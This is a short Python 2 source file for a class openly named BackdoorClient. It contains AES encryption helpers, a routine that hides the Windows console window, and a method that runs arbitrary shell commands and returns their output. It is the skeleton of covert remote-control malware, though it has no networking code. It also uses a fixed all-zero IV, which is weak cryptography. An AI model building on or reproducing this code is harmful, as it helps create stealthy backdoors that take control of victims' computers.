#!/usr/bin/env python
# coding:utf-8
import os
import ctypes
import chardet
import json
from Crypto.Cipher import AES
__author__ = 'nekocode'


class BackdoorClient:
    def __init__(self):
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return ciphertext

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(ciphertext)
        return plain

    def hide_cmd(self):
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            ctypes.windll.kernel32.CloseHandle(whnd)

    def dialog(self, content, title=u''):
        ctypes.windll.user32.MessageBoxW(None, content, title, 0)

    def cmd(self, cl):
        rlt = os.popen(cl)
        content = ''.join(rlt.readlines())
        return content.decode(chardet.detect(content)['encoding'])


if __name__ == '__main__':
    # dialog(cmd('pause'))
    clinet = BackdoorClient()
    t = clinet.encrypt('1231231233')
    print clinet.decrypt(t)
    # print decrypt('0123456789abcdef', t)

